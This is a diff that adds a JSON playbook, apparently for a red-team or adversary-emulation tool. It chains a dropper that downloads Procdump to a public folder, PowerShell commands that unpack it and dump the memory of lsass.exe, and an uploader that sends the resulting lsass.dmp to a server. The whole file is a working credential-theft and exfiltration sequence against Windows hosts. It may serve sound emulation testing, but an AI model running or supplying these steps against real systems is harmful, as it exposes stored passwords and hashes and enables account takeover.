@@ -1,0 +1,14 @@
+{
+    "playbook":{
+        "plugin":{
+            "dropper":["Drop", "C:\\Users\\Public\\Documents\\procdump.zip", "https://download.sysinternals.com/files/Procdump.zip"]
+        },
+        "commandArray":[    
+            {"powershell.exe expand-archive -Force \"C:\\Users\\Public\\Documents\\procdump.zip\"":"null"},
+            {"powershell -c ./procdump\\procdump.exe -accepteula -ma lsass.exe lsass.dmp": "null"}
+        ],
+        "plugin":{
+            "uploader":["SendFileToServer", "lsass.dmp"]
+        }
+    }
+}
